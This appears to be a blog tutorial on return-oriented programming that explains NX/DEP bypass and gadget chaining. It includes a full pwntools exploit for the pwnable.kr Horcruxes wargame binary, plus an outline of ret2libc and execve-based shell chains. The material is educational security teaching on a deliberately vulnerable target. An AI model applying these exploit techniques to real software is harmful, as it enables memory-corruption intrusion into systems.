---
title: "Return Oriented Programming: Exploitation Without Execution"
date: 2025-10-05
---

## Bypassing NX and DEP
So lets talk about ROP, virtually every compiler nowadays secures programs by adding **NX** and **DEP** attributes which means the memory is either writable or executable but never both. You can't just inject shellcode onto the stack and have it executed, it will just kill the process.
This should have in theory ended stack based exploitation but it didn't.

## How ROP Works Under the Hood
Here's the thing, you don't need to execute *new* code. The binary and it's libraries already have tons of executable code that we are able to use to our advantage.
In the epilogue of each procedure we will always see something like this:
```asm
mov esp, ebp
pop ebp ; both lines substituted as 'leave' instruction on x64
ret
```
The first two lines just clear up the local variables and restore the stack frame for the caller.
Now `ret` is the key instruction for ROP, you can think of it as sort of an abstraction for:
```asm
mov eip, [esp]
```
Normally this would contain the address of where this procedure was originally called so program execution continues as intended, but the CPU doesn't really care if the address in `eip` belongs to the caller or not - *it just goes there*.
If you control the stack, you control where every `ret` goes. That's the foundation of ROP.

## So What's a Gadget Chain?
A gadget is any sequence of instructions that ends in `ret`. They're just snippets of existing code scattered across the binary and it's libraries.
ROP chains work by overflowing a vulnerable function with arbitrary addresses so once the first gadget executes and hits it's own `ret`, that instruction just pops off the next address we've provided in the chain and jumps to it. Each gadget's `ret` becomes the bridge to the next gadget, you're basically just hijacking the return mechanism to manipulate the control flow of the program.

## Practical ROP Chaining
A great example for this type of exploitation technique is the **Horcruxes** challenge from [**pwnable.kr**](https://pwnable.kr/play.php), although this isn't really a writeup I'll try to do my best to explain how this challenge goes.
For the sake of demonstartion the binary had PIE disabled so addresses would remain static and we could just copy them into our exploit.
```sh
checksec --file=horcruxes
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols	  No	0		3		horcruxes

```
The binary initializes seven functions A-G with each of them storing a random value, and we need them sum of all these integers to receive the flag. However we cannot see those integers during regular execution since they are generated at runtime so we'll need to jump to each of the seven functions one after the other to print them out *(see where we're going?)*.
Another interesting point to clear up: *why couldn't we just use the first gadget to jump to where the flag is printed?*
The challenge's author has accounted for this, and all addresses inside the `ropme` function contain a `0a` which converts into a newline, stopping the `puts` function which relies on newlines to figure out where the end of a string is.

## The Vulnerability
Looking at the disassembly, the `ropme` function has a classic buffer overflow via `gets()`:
```asm
call   0x8041080 <gets@plt>
```
No bounds checking, no canary. We can overflow straight into the saved return address.
Now all we have to do is find the addresses *(remember, no PIE!)* of all the functions from A to G and create a chain that does the following:
1. First things first - fills up the buffer(116) allocated for the `gets()` function plus saved `ebp`(4).
2. Overflow with our address chain of the A-G functions.
3. Add the address of where `ropme` is called from `main`, since we cannot jump to inside that function.

```python
from pwn import *
from ctypes import c_int

elf = ELF("./horcruxes")
p = elf.process()

horcruxes = [
    0x0804129d,
    0x080412cf,
    0x08041301,
    0x08041333,
    0x08041365,
    0x08041397,
    0x080413c9,
]

ropme = 0x080414fc

exp = 0
p.recvuntil(b"Menu:")
p.sendline(b"123")

p.recvuntil(b"earned? : ")
payload = b"A"*116
payload += b"B"*4

for addr in horcruxes:
    payload += p32(addr)

payload += p32(ropme)
p.sendline(payload)

for _ in range(7):
    p.recvuntil(b"+")
    tmp = p.recvuntil(b")", drop=True)
    exp += int(tmp)

log.info("EXP sum: " + str(c_int(exp).value))

p.recvuntil(b"Menu:")
p.sendline(b"123")
p.recvuntil(b"earned? : ")
p.sendline(str(c_int(exp).value).encode())

p.interactive()
```
When `ropme` hits `ret` the chain begins starting at A, all the way to G, and back to ropme. Each function prints the random value, then we parse and sum handling the integer overflow. Submitting the sum back at the binary prints out the flag.

## ROP Weaponization
In the this challenge ROP was used primarily for control flow manipulation to leak values, but its real potential lies in achieving code execution. In real-world exploitation, ROP is the primary technique for bypassing Data Execution Prevention (DEP/NX) and obtaining a shell. Here are two common routes for ROP weaponization:
1. ret2libc/direct call: use resolved libc addresses to call `system("/bin/sh")`, execve, or other libc helpers. Fast and compact when libc is known or leakable.
2. Full ROP payloads: when you need more control, build a gadget chain to write strings into `.bss`, set up registers, and call `mprotect/mmap` or syscalls to change memory permissions or invoke `execve` directly. Stack pivot to a larger controlled buffer if the saved-return slot is too small.

Whether you're writing code or breaking it understanding how `ret` works, how the stack controls execution, and how code boundaries are really just conventions-that knowledge makes you better at your job. Because security isn't about what **code is supposed to do**. It's about what **code can do** when someone controls inputs you didn't expect them to control.
